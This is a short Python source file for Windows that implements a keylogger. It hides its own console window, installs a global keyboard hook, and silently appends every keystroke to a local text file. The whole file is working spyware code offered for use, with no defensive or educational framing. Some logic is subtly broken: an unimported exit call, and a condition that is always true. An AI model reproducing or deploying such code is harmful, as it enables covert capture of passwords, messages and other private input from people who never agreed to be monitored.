import win32api 
import win32console 
import win32gui 
import pythoncom, pyWinhook 
  

class Keylogger:
    def __init__(self, handler):        
        win = win32console.GetConsoleWindow() 
        win32gui.ShowWindow(win, 0) 

        self.handler = handler

    def startLogging(self):
        # create a hook manager object 
        hm = pyWinhook.HookManager() 
        hm.KeyDown = self.handler
        # set the hook 
        hm.HookKeyboard()
        # wait forever 
        pythoncom.PumpMessages() 
  
def OnKeyboardEvent(event): 
    if event.Ascii==5: 
        _exit(1) 
    if event.Ascii !=0 or 8:
        if event.Ascii == 13:
            writeLogsToFile('\n') 
        else:
            writeLogsToFile(chr(event.Ascii))
    # Event handler has to return an integer per documentation
    return 0

def writeLogsToFile(keylogs):
    #open output.txt to read current keystrokes 
    f = open('./output.txt', 'r+') 
    buffer = f.read() 
    f.close() 
    # open output.txt to write current + new keystrokes 
    f = open('./output.txt', 'w') 
    buffer += keylogs 
    f.write(buffer) 
    f.close() 

if __name__ == "__main__":
    logger = Keylogger(handler=OnKeyboardEvent)
    logger.startLogging()